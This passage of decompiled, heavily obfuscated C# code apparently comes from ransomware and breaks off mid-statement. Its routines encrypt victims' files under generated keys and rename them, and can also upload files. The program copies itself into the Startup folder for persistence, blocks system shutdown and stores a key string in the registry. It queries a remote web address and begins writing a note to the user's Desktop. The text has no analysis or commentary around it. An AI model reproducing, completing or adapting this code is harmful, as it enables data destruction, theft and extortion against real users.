										File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107397969) + CS_0024_003C_003E8__locals0.hGfHXtUEXE + getString_0(107349031) + ex6.Message + getString_0(107396563));
									}
									catch (Exception)
									{
									}
								}
								PuPUesizAwkkz++;
								return;
							}
							if (EonUYJCKfDwF != getString_0(107398221))
							{
								CS_0024_003C_003E8__locals0.hGfHXtUEXE += EonUYJCKfDwF;
							}
							if (cGbDMszYvGe == getString_0(107396796))
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item in UaltDtqfmMVTAX)
									{
										if (CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.EqCJrbOGYCEo.EonUYJCKfDwF) && cGDFQVDbXvzo == lMWNgthKPX.getString_0(107396802))
										{
											if (Convert.ToInt32(dJYbFJwmiw) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.hGfHXtUEXE).Length)
											{
												try
												{
													mzYnDQcPQMD.ubBkhifeJCfa(lMWNgthKPX.getString_0(107401555), lMWNgthKPX.getString_0(107401550), lMWNgthKPX.getString_0(107401569), CS_0024_003C_003E8__locals0.hGfHXtUEXE);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().EndsWith(item) && cGDFQVDbXvzo == lMWNgthKPX.getString_0(107397059))
										{
											try
											{
												mzYnDQcPQMD.ubBkhifeJCfa(lMWNgthKPX.getString_0(107401555), lMWNgthKPX.getString_0(107401550), lMWNgthKPX.getString_0(107401569), CS_0024_003C_003E8__locals0.hGfHXtUEXE);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							string text = fDzYxdGrlFct.LiytReEiZfhPA(32);
							string text2 = getString_0(107401500);
							text2 = (IflXfWBKZN ? fDzYxdGrlFct.rrVuhdVHDJo() : getString_0(107401500));
							string s = EURLmwFlibc.RjcOjZuEiYhKh(text + text2);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (PurCmZibxBamv == getString_0(107397053))
							{
								byte[] array2 = null;
								byte[] byte_ = TplgMgKkTztrkdI.GDREwDOvqQ(CS_0024_003C_003E8__locals0.hGfHXtUEXE, Convert.ToInt32(XLyVBayizjzN) * 1024 * 1024);
								if (!TplgMgKkTztrkdI.txaKUWpwgCrrkU(NviomBsLdCW: (!FmiPpRhQSBxQ) ? (IflXfWBKZN ? TplgMgKkTztrkdI.vtWmNLyRqcLW(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : TplgMgKkTztrkdI.vtWmNLyRqcLW(byte_, Convert.FromBase64String(QsejQwxWKSqe), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (IflXfWBKZN ? nqDlrZSqItsRF.PWhWBEuyfRKWPX(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : nqDlrZSqItsRF.PWhWBEuyfRKWPX(byte_, Convert.FromBase64String(QsejQwxWKSqe), Convert.FromBase64String(eUUqvSerqkEdI))), lswqspBeUzjGi: CS_0024_003C_003E8__locals0.hGfHXtUEXE, AftuALoSYuJQ: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.hGfHXtUEXE + EonUYJCKfDwF, CS_0024_003C_003E8__locals0.hGfHXtUEXE);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!IflXfWBKZN)
							{
								if (!ubLoTFodkJ.ExViKdySZgBq(CS_0024_003C_003E8__locals0.hGfHXtUEXE, XLyVBayizjzN, QsejQwxWKSqe, null, Convert.FromBase64String(eUUqvSerqkEdI)))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.hGfHXtUEXE + EonUYJCKfDwF, CS_0024_003C_003E8__locals0.hGfHXtUEXE);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!ubLoTFodkJ.ExViKdySZgBq(CS_0024_003C_003E8__locals0.hGfHXtUEXE, XLyVBayizjzN, text, bytes, Convert.FromBase64String(text2)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.hGfHXtUEXE + EonUYJCKfDwF, CS_0024_003C_003E8__locals0.hGfHXtUEXE);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (lHJbFcHZdNnC)
							{
								EonUYJCKfDwF = GrEoYlDdrrJcnWE + EonUYJCKfDwF;
							}
							string text3 = fDzYxdGrlFct.LiytReEiZfhPA(32);
							string text4 = getString_0(107401500);
							text4 = (IflXfWBKZN ? fDzYxdGrlFct.rrVuhdVHDJo() : getString_0(107401500));
							string s2 = EURLmwFlibc.RjcOjZuEiYhKh(text3 + text4);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (EonUYJCKfDwF != getString_0(107398221))
							{
								if (!yNTMpjtZXpajKX)
								{
									if (!IflXfWBKZN)
									{
										iZHZdbWaVjfuoZyn(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE + EonUYJCKfDwF, dZNuvPCEnaSnNI);
									}
									else
									{
										iZHZdbWaVjfuoZyn(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE + EonUYJCKfDwF, Convert.FromBase64String(text3));
									}
								}
								else
								{
									try
									{
										if (!IflXfWBKZN)
										{
											cpHiazSZzHHd(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE + EonUYJCKfDwF, dZNuvPCEnaSnNI, Convert.FromBase64String(eUUqvSerqkEdI));
										}
										else
										{
											cpHiazSZzHHd(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE + EonUYJCKfDwF, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
										}
									}
									catch (Exception ex11)
									{
										if (SBPYnaSzKyFP)
										{
											try
											{
												File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107397969) + CS_0024_003C_003E8__locals0.hGfHXtUEXE + getString_0(107398239) + ex11.Message + getString_0(107396563));
											}
											catch (Exception)
											{
											}
										}
										PuPUesizAwkkz++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.hGfHXtUEXE + EonUYJCKfDwF, CS_0024_003C_003E8__locals0.hGfHXtUEXE);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!yNTMpjtZXpajKX)
							{
								if (!IflXfWBKZN)
								{
									iZHZdbWaVjfuoZyn(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE + getString_0(107398216), dZNuvPCEnaSnNI);
								}
								else
								{
									iZHZdbWaVjfuoZyn(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE + getString_0(107398216), Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!IflXfWBKZN)
									{
										cpHiazSZzHHd(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE, dZNuvPCEnaSnNI, Convert.FromBase64String(eUUqvSerqkEdI));
									}
									else
									{
										cpHiazSZzHHd(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex14)
								{
									if (SBPYnaSzKyFP)
									{
										try
										{
											File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107397969) + CS_0024_003C_003E8__locals0.hGfHXtUEXE + getString_0(107398239) + ex14.Message + getString_0(107396563));
										}
										catch (Exception)
										{
										}
									}
									PuPUesizAwkkz++;
									return;
								}
							}
							if (IflXfWBKZN)
							{
								if (EonUYJCKfDwF != getString_0(107398221))
								{
									vtJKNupXtRpM(CS_0024_003C_003E8__locals0.hGfHXtUEXE + EonUYJCKfDwF, bytes2);
								}
								else
								{
									vtJKNupXtRpM(CS_0024_003C_003E8__locals0.hGfHXtUEXE, bytes2);
								}
							}
						}
						end_IL_085c_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_1069;
			IL_1069:
			mBwKTyYUMnTK.Remove(CS_0024_003C_003E8__locals0.hGfHXtUEXE);
		}

		static dOYydSKoLzIp()
		{
			Strings.CreateGetStringDelegate(typeof(dOYydSKoLzIp));
		}
	}

	private sealed class yXTzQNUHviShmVK
	{
		public string IydBnzUZeTLaoWq;

		public string gKzpVcIViue;

		public void _003CEncrypt2_003Eb__44()
		{
			while (true)
			{
				try
				{
					File.Delete(IydBnzUZeTLaoWq);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__45()
		{
			while (true)
			{
				try
				{
					if (File.Exists(gKzpVcIViue))
					{
						File.Delete(gKzpVcIViue);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string VMhrtGevQTYP;

	public static byte[] dZNuvPCEnaSnNI;

	public static string CoRisaOZQor;

	public static string nPUtTAwIhKI;

	public static List<string> uneznyCLJqjxYvh;

	public static List<string> aTbIvfXzzM;

	public static string IHgutBWdklyx;

	public static string QsejQwxWKSqe;

	public static string eUUqvSerqkEdI;

	public static string PSLFxlnexYjPkVyG;

	public static string ZqIKwVipNw;

	public static int ZrHuXCWPdBnMk;

	public static string FiFLjMAxemfbt;

	public static string wwxjRIMUyCe;

	public static string VLTXZZcUskxZVi;

	public static string pscYwyjbLrOZfWlB;

	public static string NZZsrOuUzv;

	public static string HBPEpFutnsnm;

	public static string uCMWAaikfKf;

	public static string WXazMqNlFCpUGp;

	public static List<string> IdBEQJBpIwA;

	public static List<string> kEshrQncftX;

	public static string sbuoMRESEqoLl;

	public static string FUJmNlHLFZTmekFFC;

	public static string sFItEeLBHlsrVRp;

	public static List<string> fQuiHGzOTAlx;

	public static string jKmROTPyfgIG;

	private static string NnofqqnNvs;

	public static string CYtyMsjHbrwM;

	public static string GjaEhDGSTsF;

	public static List<string> oMoyqBDWYl;

	public static List<string> rPkvGTbuGbKlHk;

	public static List<string> YxlLJRTpOOTgKkLzz;

	public static List<string> sneXTQQmOIFmFM;

	public static string bgwisiXwlPmoFco;

	public static List<string> fSptdVtByMByFE;

	public static List<string> WwjgRtkeddRd;

	public static string jjxOZZRUPUiL;

	public static string QjwaBCasTSIkuFgA;

	internal static DateTime HprmrDSzmoXK;

	internal static DateTime mnRhAhrYmeCcsdB;

	public static string eUAtnXtzwCVQtt;

	public static string XLyVBayizjzN;

	public static string kRmBAOPJNOqdHxW;

	public static string JcwYCPMNkxijQ;

	public static string wTpXdatYnvXq;

	public static string iWmgoPryUvSwWT;

	public static string jFVgkGFGvKoyCKqOp;

	public static string cGbDMszYvGe;

	public static List<string> UaltDtqfmMVTAX;

	public static string cGDFQVDbXvzo;

	public static string dJYbFJwmiw;

	public static string auHbFQzfmbroMlO;

	public static string iFPTiHpTDRrR;

	public static string rpbxJAndynMksS;

	public static string fbKaZQvVeOFg;

	public static string aiSGqJNVmYLYQ;

	public static string rGfFEILyJI;

	public static string SgOqmfmWgCMNrdugt;

	public static string mEpMhYqsELjvCfA;

	public static string bzSBnkmcadit;

	public static string rPQlMTQJMUUaO;

	public static string bdPZLvWKkUcu;

	public static string nEPIZtCfLkv;

	public static string HLwpUzkQrQyFV;

	public static string RHcwPQtLOPgH;

	public static string CXPDhTmLTlpN;

	public static string ydGOJVSzVrI;

	public static string KAbTnSEazgmpKG;

	public static string COjZSLMnxffln;

	public static string cOCKAOtbAbbLiQ;

	public static string TbmfDCXNYceV;

	public static string bMkJlSMZTmkVPl;

	public static string pzIDJESPERYAQ;

	public static string HEeLoGRVTvMU;

	public static string GNdCuoTxzXg;

	public static string PurCmZibxBamv;

	public static string YSIpebDxZdNRX;

	public static string aprXJMnTJqstf;

	public static string[] GoQslNJCCQhWEu;

	public static string KZdUWCMWRza;

	public static bool FmiPpRhQSBxQ;

	public static string MNFaJbAsZzAD;

	public static bool IflXfWBKZN;

	public static bool wDQibieeLNEkihtFqY;

	public static bool fhkzHhxqmReTYU;

	public static bool CQvIJIjeDHGW;

	public static string ndioqUCcjeEwRygxn;

	public static bool SBPYnaSzKyFP;

	public static bool vtnkqBqncirnis;

	public static bool aSxiCmyOtyigH;

	public static bool ZdPTJTivRQPn;

	public static bool yNTMpjtZXpajKX;

	public static string zSigBrcrKLvB;

	public static bool RxwgNpmsCUXw;

	public static Stopwatch MeHuYvklCiQWeK;

	public static int PuPUesizAwkkz;

	public static int SYFhGDZRgJn;

	public static bool lHJbFcHZdNnC;

	public static string GrEoYlDdrrJcnWE;

	public static string[] wWEhXkamzgNAqO;

	public static List<string> pwLkvVGaTZr;

	public static int gcVeDsTCahqU;

	public static bool mvGCZjuzXBvoZJaB;

	public static bool QYhkARZFRiOZ;

	public static List<string> GvytrdWotRtJ;

	public static List<string> uAIiMVCysCTsJma;

	public static List<string> uRXFcIqdLpjb;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatec;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a;

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	private static extern bool SetProcessShutdownParameters(uint uint_0, uint uint_1);

	private static void Main(string[] args)
	{
		try
		{
			GLfKfCJiKTIW CS_0024_003C_003E8__locals0 = new GLfKfCJiKTIW();
			CS_0024_003C_003E8__locals0.gvllsCCLJzdL = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.gvllsCCLJzdL) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			lndSNgHfcVC.hSNJkCWzxhJibq(NnofqqnNvs);
		}
		catch (Exception)
		{
		}
		try
		{
			if (GNdCuoTxzXg == getString_0(107396776))
			{
				Thread thread = new Thread(OIVjlYgSFvP.fVnjmfBRXpySmrQRn);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		SetProcessShutdownParameters(0u, 0u);
		if (VLTXZZcUskxZVi == getString_0(107396776))
		{
			Thread.Sleep(int.Parse(pscYwyjbLrOZfWlB));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && jFVgkGFGvKoyCKqOp == getString_0(107396776))
		{
			try
			{
				HLRJgXuHjbqaVb(jGDSNxQzvqSx(getString_0(107396739)));
			}
			catch
			{
			}
		}
		try
		{
			if (uCMWAaikfKf == getString_0(107396776) && csaxtIGbGfXZK.pAkOWuRbTbrVqH())
			{
				new KRaOgpcKUef().YOUOlTbYLwvsU(bool_0: false);
				csaxtIGbGfXZK.TMErPNHVRuQVI();
			}
		}
		catch (Exception)
		{
		}
		if (FUJmNlHLFZTmekFFC == getString_0(107396776) && csaxtIGbGfXZK.pAkOWuRbTbrVqH())
		{
			new KRaOgpcKUef().YOUOlTbYLwvsU(bool_0: false);
			new KRaOgpcKUef().KdaynHekAElXkXya();
		}
		if (wwxjRIMUyCe == getString_0(107396776))
		{
			YQasREsHfJn.FuqubqSfnMiGk();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397146);
			string text2 = text + Path.GetFileName(fileName);
			if (ZqIKwVipNw == getString_0(107396776) && fileName != text2)
			{
				Thread thread2 = new Thread(dZwyDZnQVVsHXe);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (IHgutBWdklyx == getString_0(107396776) && mainModule != null && fileName != text2)
			{
				try
				{
					ZrHuXCWPdBnMk = KSoAEZwyRtA(0, IdBEQJBpIwA.Count);
					File.Copy(fileName, text + IdBEQJBpIwA[ZrHuXCWPdBnMk], overwrite: true);
					Process.Start(text + IdBEQJBpIwA[ZrHuXCWPdBnMk]);
					GusvsHdJcE();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (jjxOZZRUPUiL == getString_0(107396776) && DateTime.Now < HprmrDSzmoXK)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (QjwaBCasTSIkuFgA == getString_0(107396776) && DateTime.Now > mnRhAhrYmeCcsdB)
			{
				GusvsHdJcE();
			}
		}
		catch
		{
		}
		aodkgojwRcyrWr();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatec == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatec = delegate
			{
				List<string> source = rPkvGTbuGbKlHk;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						wCRzvBOPsnK(jGDSNxQzvqSx(getString_0(107398134)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				List<string> yxlLJRTpOOTgKkLzz = YxlLJRTpOOTgKkLzz;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
					{
						wCRzvBOPsnK(jGDSNxQzvqSx(getString_0(107398153)), string_0);
					};
				}
				Parallel.ForEach(yxlLJRTpOOTgKkLzz, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				if (aprXJMnTJqstf == getString_0(107396776))
				{
					string[] goQslNJCCQhWEu = GoQslNJCCQhWEu;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							wCRzvBOPsnK(jGDSNxQzvqSx(getString_0(107398153)), getString_0(107398128) + string_0 + getString_0(107398119));
						};
					}
					Parallel.ForEach(goQslNJCCQhWEu, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				if (!yoVntBnyjeiaCWdn().Contains(getString_0(107397815)))
				{
					MrGKXccdJYxE(bgwisiXwlPmoFco);
				}
				else
				{
					List<string> source2 = sneXTQQmOIFmFM;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
						{
							wCRzvBOPsnK(jGDSNxQzvqSx(WtpiMWAvqdSBV(getString_0(107398082))), string_0);
						};
					}
					Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				}
				List<string> source3 = fSptdVtByMByFE;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
					{
						wCRzvBOPsnK(jGDSNxQzvqSx(getString_0(107398089)), string_0);
					};
				}
				Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatec);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397141))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397141)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(getString_0(107397156)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !uneznyCLJqjxYvh.Contains(text6) && text6 != getString_0(107397135) && text6 != getString_0(107397082) && text6 != getString_0(107397093))
								{
									uneznyCLJqjxYvh.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107397064)))
					{
						string text7 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397019))
						{
							bdPZLvWKkUcu = getString_0(107396776);
						}
						else if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397042))
						{
							bdPZLvWKkUcu = getString_0(107397033);
						}
					}
					if (text3.Contains(getString_0(107397028)))
					{
						string text8 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107397019))
						{
							RxwgNpmsCUXw = true;
						}
						else if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107397042))
						{
							RxwgNpmsCUXw = false;
						}
					}
					if (text3.Contains(getString_0(107397011)))
					{
						string text9 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107397019))
						{
							SBPYnaSzKyFP = true;
						}
						else if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107397042))
						{
							SBPYnaSzKyFP = false;
						}
					}
					if (text3.Contains(getString_0(107396998)))
					{
						string text10 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text10) && text10.ToLower() == getString_0(107397019))
						{
							mvGCZjuzXBvoZJaB = true;
						}
						else if (!string.IsNullOrEmpty(text10) && text10.ToLower() == getString_0(107397042))
						{
							mvGCZjuzXBvoZJaB = true;
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (SBPYnaSzKyFP)
			{
				try
				{
					File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107396457) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (bdPZLvWKkUcu == getString_0(107397033))
		{
			uozMcBNAbBiV();
		}
		if (QYhkARZFRiOZ)
		{
			try
			{
				Console.WriteLine(getString_0(107396380));
				YNIMLwYhLFZcQ.GapIOgpfRBoea();
			}
			catch (Exception ex8)
			{
				if (SBPYnaSzKyFP)
				{
					try
					{
						File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107396359) + ex8.Message);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (bdPZLvWKkUcu == getString_0(107396776))
		{
			try
			{
				gbqGrViywCrG();
			}
			catch
			{
			}
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && fhkzHhxqmReTYU)
			{
				try
				{
					Thread thread4 = new Thread(HnajMQVCpr.HLgcGHDmEtjgF);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			wCRzvBOPsnK(getString_0(107396282), jGDSNxQzvqSx(getString_0(107396301)));
		}
		if (sbuoMRESEqoLl == getString_0(107396776) && QWdsIEizGgKuKem() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread5 = new Thread(msEWcjiviXrSH.rfnIFsglmQJasup);
			thread5.IsBackground = true;
			thread5.Priority = ThreadPriority.Normal;
			thread5.Start();
		}
		_ = GjaEhDGSTsF == getString_0(107396776);
		SecureString secureString = new SecureString();
		if (kRmBAOPJNOqdHxW == getString_0(107397033))
		{
			QsejQwxWKSqe = fDzYxdGrlFct.LiytReEiZfhPA(32);
			eUUqvSerqkEdI = fDzYxdGrlFct.rrVuhdVHDJo();
		}
		else
		{
			QsejQwxWKSqe = getString_0(107396228);
		}
		PSLFxlnexYjPkVyG = EURLmwFlibc.RjcOjZuEiYhKh(QsejQwxWKSqe + eUUqvSerqkEdI);
		if (!IflXfWBKZN)
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(jGDSNxQzvqSx(getString_0(107396663)));
				if (registryKey != null)
				{
					registryKey.SetValue(jGDSNxQzvqSx(getString_0(107396650)) + (registryKey.ValueCount + 1), PSLFxlnexYjPkVyG);
					registryKey.Close();
				}
			}
			catch (Exception)
			{
			}
		}
		else
		{
			try
			{
				RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(jGDSNxQzvqSx(getString_0(107396663)));
				if (registryKey2 != null && registryKey2.ValueCount == 0)
				{
					registryKey2.SetValue(jGDSNxQzvqSx(getString_0(107396650)) + (registryKey2.ValueCount + 1), PSLFxlnexYjPkVyG);
					registryKey2.Close();
				}
				else if (registryKey2 != null && registryKey2.ValueCount != 0)
				{
					registryKey2.Close();
				}
			}
			catch (Exception)
			{
			}
		}
		if (rGfFEILyJI == getString_0(107396776))
		{
			DCMvWfwrrcVAEh();
		}
		if (aSxiCmyOtyigH)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), zSigBrcrKLvB)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), zSigBrcrKLvB), string.Concat(jGDSNxQzvqSx(getString_0(107396609)), new WebClient().DownloadString(jGDSNxQzvqSx(getString_0(107396616))), getString_0(107396543), jGDSNxQzvqSx(getString_0(107396538)), DateTime.Now, getString_0(107396543), jGDSNxQzvqSx(getString_0(107396529)), PSLFxlnexYjPkVyG));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), zSigBrcrKLvB), getString_0(107395928) + PSLFxlnexYjPkVyG);
				}
			}
			catch (Exception ex13)
			{
				if (SBPYnaSzKyFP)
				{
					try
					{
						File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107395899) + ex13.Message + getString_0(107396543));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		nWsIcXocniNgP.xUJJzuireoApv(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), COjZSLMnxffln), TBabZzWvTSzO(PSLFxlnexYjPkVyG), null, null, getString_0(107395882), getString_0(107395833), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			jwzVdaHKUfgHS();
		}
		try
		{
			try
			{
				if (RxwgNpmsCUXw)
				{
					Console.WriteLine(getString_0(107395848));
				}
			}
			catch
			{
			}
			wjGAPSYVjdEWTA(new string[1] { getString_0(107395767) }, new string[100]
			{
				getString_0(107395790),
				getString_0(107395785),
				getString_0(107395780),
				getString_0(107395739),
				getString_0(107395734),
				getString_0(107395761),
				getString_0(107395756),
				getString_0(107395751),
				getString_0(107395714),
				getString_0(107395709),
				getString_0(107395704),
				getString_0(107395731),
				getString_0(107395722),
				getString_0(107395717),
				getString_0(107396188),
				getString_0(107396183),
				getString_0(107396210),
				getString_0(107396205),
				getString_0(107396200),
				getString_0(107396163),
				getString_0(107396154),
				getString_0(107396149),
				getString_0(107396176),
				getString_0(107396171),
				getString_0(107396166),
				getString_0(107396129),
				getString_0(107396124),
				getString_0(107396119),
				getString_0(107396146),
				getString_0(107396141),
				getString_0(107396136),
				getString_0(107396099),
				getString_0(107396094),
				getString_0(107396089),
				getString_0(107396112),
				getString_0(107396107),
				getString_0(107396102),
				getString_0(107396065),
				getString_0(107395756),
				getString_0(107396060),
				getString_0(107395714),
				getString_0(107396083),
				getString_0(107396078),
				getString_0(107396073),
				getString_0(107396068),
				getString_0(107396031),
				getString_0(107396026),
				getString_0(107396021),
				getString_0(107396048),
				getString_0(107396043),
				getString_0(107396038),
				getString_0(107396001),
				getString_0(107395996),
				getString_0(107395991),
				getString_0(107396018),
				getString_0(107396013),
				getString_0(107396008),
				getString_0(107395971),
				getString_0(107395962),
				getString_0(107395957),
				getString_0(107395980),
				getString_0(107395423),
				getString_0(107396060),
				getString_0(107395442),
				getString_0(107395433),
				getString_0(107395392),
				getString_0(107395383),
				getString_0(107395406),
				getString_0(107395397),
				getString_0(107395360),
				getString_0(107395351),
				getString_0(107395374),
				getString_0(107395365),
				getString_0(107395328),
				getString_0(107395323),
				getString_0(107395318),
				getString_0(107395345),
				getString_0(107395340),
				getString_0(107395335),
				getString_0(107395294),
				getString_0(107395289),
				getString_0(107395284),
				getString_0(107395311),
				getString_0(107395306),
				getString_0(107395301),
				getString_0(107395260),
				getString_0(107395283),
				getString_0(107395278),
				getString_0(107396094),
				getString_0(107395273),
				getString_0(107395268),
				getString_0(107395231),
				getString_0(107395226),
				getString_0(107395221),
				getString_0(107395244),
				getString_0(107395239),
				getString_0(107395202),
				getString_0(107395193),
				getString_0(107395188),
				getString_0(107395215)
			}, new string[0], QsejQwxWKSqe, getString_0(107395210));
		}
		catch (Exception ex15)
		{
			if (SBPYnaSzKyFP)
			{
				try
				{
					File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107395673) + ex15.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395648)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395648));
				streamWriter.WriteLine(jGDSNxQzvqSx(getString_0(107395615)));
